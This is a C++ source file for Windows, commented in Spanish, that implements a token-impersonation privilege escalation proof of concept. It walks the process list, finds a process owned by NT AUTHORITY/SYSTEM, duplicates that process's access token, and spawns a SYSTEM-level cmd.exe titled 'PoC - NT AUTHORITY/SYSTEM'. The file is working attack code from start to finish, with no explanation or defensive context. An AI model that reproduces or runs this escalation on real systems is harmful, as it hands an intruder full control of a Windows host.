#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <stdexcept>  // Necesario para std::runtime_error
#include <vector>     // Necesario para std::vector

using namespace std;

// Obtiene el token de acceso del proceso con el PID dado
HANDLE getToken(DWORD pid) {
    HANDLE cToken = NULL;
    HANDLE ph = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid);
    if (ph == NULL) {
        throw runtime_error("Failed to open process.");
    }

    BOOL res = OpenProcessToken(ph, MAXIMUM_ALLOWED, &cToken);
    CloseHandle(ph);
    if (!res) {
        throw runtime_error("Failed to open process token.");
    }

    return cToken;
}

// Crea un nuevo proceso usando el token duplicado del proceso dado
BOOL createProcess(HANDLE token, LPCWSTR app, LPCWSTR cmdLine) {
    HANDLE dToken = NULL;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    BOOL res;

    ZeroMemory(&si, sizeof(STARTUPINFOW));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    si.cb = sizeof(STARTUPINFOW);

    res = DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dToken);
    if (!res) {
        throw runtime_error("Failed to duplicate token.");
    }

    res = CreateProcessWithTokenW(dToken, LOGON_WITH_PROFILE, app, (LPWSTR)cmdLine, 0, NULL, NULL, &si, &pi);
    CloseHandle(dToken);
    if (!res) {
        throw runtime_error("Failed to create process with duplicated token.");
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return res;
}

// Obtiene el nombre de usuario asociado con el token de acceso del proceso con el PID dado
string GetProcessUserName(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) return "";

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        CloseHandle(hProcess);
        return "";
    }

    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
    PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(dwSize);

    if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
        free(pTokenUser);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return "";
    }

    SID_NAME_USE SidType;
    char lpName[MAX_PATH];
    DWORD dwNameSize = MAX_PATH;
    char lpDomain[MAX_PATH];
    DWORD dwDomainSize = MAX_PATH;

    if (!LookupAccountSid(NULL, pTokenUser->User.Sid, lpName, &dwNameSize, lpDomain, &dwDomainSize, &SidType)) {
        free(pTokenUser);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return "";
    }

    string username(lpDomain);
    username += "/";
    username += lpName;

    free(pTokenUser);
    CloseHandle(hToken);
    CloseHandle(hProcess);
    return username;
}

int main() {
    try {
        string username;
        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;

        // Prepara la línea de comandos para establecer el título
        wstring wapp = L"cmd.exe";
        wstring wcmdLine = L"/c title PoC - NT AUTHORITY/SYSTEM && cmd";
        LPCWSTR LPCapp = wapp.c_str();
        LPCWSTR LPCcmdLine = wcmdLine.c_str();

        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hProcSnap == INVALID_HANDLE_VALUE) {
            throw runtime_error("Failed to create process snapshot.");
        }

        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (!Process32First(hProcSnap, &pe32)) {
            CloseHandle(hProcSnap);
            throw runtime_error("Failed to retrieve first process.");
        }

        while (Process32Next(hProcSnap, &pe32)) {
            pid = pe32.th32ProcessID;
            username = GetProcessUserName(pid);
            if (username.empty() || username == "NT AUTHORITY/SYSTEM") {
                bool success = false;
                HANDLE cToken = getToken(pid);
                if (cToken) {
                    success = createProcess(cToken, LPCapp, LPCcmdLine);
                    CloseHandle(cToken);
                    if (success) {
                        break;
                    }
                }
            }
        }

        CloseHandle(hProcSnap);
        return 0;

    } catch (const exception& ex) {
        cerr << "Error: " << ex.what() << endl;
        return 1;
    }
}

